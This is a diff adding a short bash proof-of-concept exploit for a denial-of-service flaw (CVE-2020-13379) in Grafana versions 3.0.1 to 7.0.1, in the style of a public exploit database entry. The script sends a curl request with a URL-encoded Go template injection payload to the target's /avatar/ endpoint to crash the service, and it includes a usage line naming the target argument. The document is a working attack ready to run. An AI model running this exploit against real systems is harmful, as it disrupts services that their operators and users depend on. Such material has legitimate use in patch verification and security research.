@@ -1,0 +1,16 @@
+# Exploit Title: Grafana 7.0.1 - Denial of Service (PoC)
+# Date: 2020-05-23
+# Exploit Author: mostwanted002
+# Vendor Homepage: https://grafana.com/
+# Software Link: https://grafana.com/grafana/download
+# Version: 3.0.1 - 7.0.1
+# Tested on: Linux
+# CVE : CVE-2020-13379
+
+#!/bin/bash
+
+if [[ $1 != "" ]]; then
+    curl -I "${1}/avatar/%7B%7Bprintf%20%22%25s%22%20%22this.Url%22%7D%7D"
+else
+    echo "Usage: grafana-dos.sh <TARGET>.   Example: grafana-dos.sh http://localhost:3000"
+fi
